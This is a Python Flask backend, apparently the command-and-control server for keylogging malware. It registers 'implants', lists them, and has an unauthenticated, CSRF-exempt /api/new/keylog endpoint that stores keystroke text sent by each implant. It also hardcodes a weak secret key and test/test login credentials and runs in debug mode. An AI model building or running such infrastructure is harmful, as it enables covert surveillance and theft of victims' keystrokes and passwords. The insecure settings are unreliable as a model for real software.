from flask import Flask, jsonify, render_template, request
import os
from flask_login import (
    LoginManager,
    UserMixin,
    current_user,
    login_required,
    login_user,
    logout_user,
)
from flask_wtf.csrf import CSRFProtect, generate_csrf
from flask_cors import CORS
from db import Database
import json

db = Database()
db.start_db()

app = Flask(__name__, static_folder="public")
app.config.update(
    DEBUG=True,
    SECRET_KEY="secret_sauce",  # Use a strong key in production
    SESSION_COOKIE_HTTPONLY=True,  # Session cookie can't be accessed by JavaScript
    SESSION_COOKIE_SAMESITE="Strict",  # Prevent CSRF
    SESSION_COOKIE_SECURE=False,  # Set to True in production with HTTPS
    REMEMBER_COOKIE_HTTPONLY=True,  # Remember me cookie can't be accessed by JavaScript
    REMEMBER_COOKIE_DURATION=3600,  # Customize the duration of the remember cookie (1 hour for demo)
)

# Initialize CORS for cross-origin requests from the Svelte frontend (on port 8080)
CORS(app, supports_credentials=True, origins=["http://localhost:8080"])

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.session_protection = "strong"

# Enable CSRF protection
csrf = CSRFProtect(app)

# Dummy user database (replace with a real database in production)
users = [
    {
        "id": 1,
        "username": "test",
        "password": "test",
    }
]

# Serve CSRF token
@app.route("/api/csrf-token", methods=["GET"])
def csrf_token():
    """Serve CSRF token via X-CSRFToken header."""
    token = generate_csrf()
    response = jsonify({"message": "CSRF token generated"})
    response.headers.set("X-CSRFToken", token)  # Set the CSRF token in the headers
    return response

@app.route("/api/implants", methods=["GET"])
def implants():
    return jsonify(db.get_all_implants())

@app.route("/api/implant", methods=["POST"])
def implant():
    data = request.json
    print(data)
    return jsonify(db.get_implant(data["implantId"]))

# User class for Flask-Login
class User(UserMixin):
    def __init__(self, id):
        self.id = id

    def get_id(self):
        return str(self.id)  # Flask-Login expects string IDs


def get_user(user_id: int):
    """Fetch the user from the dummy database by ID."""
    for user in users:
        if int(user["id"]) == int(user_id):
            return user
    return None


@login_manager.user_loader
def user_loader(id: int):
    """Load the user by their ID for Flask-Login."""
    user = get_user(id)
    if user:
        return User(id=user["id"])
    return None

app.template_folder = os.path.abspath("/home/evand/Programming/super/c2/frontend/templates")
app.static_folder = os.path.abspath("/home/evand/Programming/super/c2/frontend/public")

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def home(path):
    """Serve the frontend single-page application."""
    return render_template("index.html")


@app.route("/api/login", methods=["POST"])
def login():
    """Login API route for authenticating users."""
    data = request.json
    username = data.get("username")
    password = data.get("password")
    remember = data.get("remember", False)  # Capture the "remember me" option

    # Check credentials in the dummy database
    for user in users:
        if user["username"] == username and user["password"] == password:
            user_model = User(user["id"])  # Create a User object
            login_user(user_model, remember=remember)  # Log the user in and set the session
            return jsonify({"login": True})

    return jsonify({"login": False}), 401


@app.route("/api/data", methods=["GET"])
@login_required
def user_data():
    """Return the logged-in user's data."""
    user = get_user(current_user.id)
    if user:
        return jsonify({"username": user["username"]})
    return jsonify({"error": "User not found"}), 404


@app.route("/api/getsession")
def check_session():
    """Check if the user is authenticated."""
    if current_user.is_authenticated:
        return jsonify({"login": True})
    return jsonify({"login": False})


@app.route("/api/logout", methods=["POST"])
@login_required
def logout():
    """Logout API route to log the user out."""
    logout_user()  # Clear the session
    return jsonify({"logout": True})

@app.route("/api/new/implant", methods=["GET"])
def new_implant():
    return jsonify(db.new_implant())
    
@app.route("/api/new/keylog", methods=["POST"])
@csrf.exempt
def new_keylog():
    print("in new keyschlawg")
    data = request.data.decode()
    data = data.split("\n")
    print(data[0])
    print(data[1])
    id_json = json.loads(data.pop(0))
    implant_id = int(id_json["id"])
    text = " ".join(data)
    print(f"Putting data into implant id {implant_id}")
    print(f"{text}")
    return jsonify(db.new_keylog(text, implant_id))

@app.errorhandler(400)
def bad_request_error(e):
    print("Request data:", request.data)
    print("Request form:", request.form)
    print("Request JSON:", request.json)
    return "Bad Request", 400
if __name__ == "__main__":
    app.debug=True
    app.run(debug=True)
